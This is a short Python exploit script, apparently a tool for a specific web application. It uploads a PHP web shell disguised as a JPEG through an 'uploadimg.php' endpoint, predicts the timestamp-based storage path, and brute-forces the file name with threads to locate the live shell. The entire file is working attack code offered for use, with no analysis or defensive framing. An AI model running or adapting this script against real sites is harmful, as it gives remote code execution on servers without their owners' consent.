# -*- coding:utf-8 -*-
import requests
import threading
import time
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("-u")
args = parser.parse_args()
urls = args.u
urlib = urls+'uploadimg.php'
def B(url):
    try:
        if requests.get(url,timeout=3).status_code == 200:
            lock.acquire()
            print("[+++] shell地址:", url)
            lock.release()
    except:
        pass
def L(url,filename):
	print('[+++] ADMINSS:正在尝试上传shell')
	try:
		urls = '%s'%url
		files = {'g_fu_image[]': ('%s'%filename, open('%s'%filename, 'rb'), 'image/jpg', {'Expires': '0'})}
		r = requests.post(urls, files=files)
		fname = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
		froot = '/uploadfiles/'+time.strftime('%Y-%m',time.localtime(time.time()))+'/'
		upfrt = urls+froot+fname
		shll =  upfrt.replace('uploadimg.php/', '')
		return shll
	except:
		bugs = '[+++]ERROR:文件上传失败'
		print(bugs)
print('[+++] ADMINSS:'+urls)
shel = L(urlib,'1.phtml')
shell = shel
print('[+++] ADMINSS:上传成功 正在爆破shell地址')
lock = threading.Lock()
pool = []
for x in range(100, 999):
    pool.append(threading.Thread(target=B, args=(shell+str(x)+'.phtml',)))
    if len(pool) > 20 or x == 998:
        for x in pool:
            x.start()
       	for x in pool:
           	x.join()
        pool = []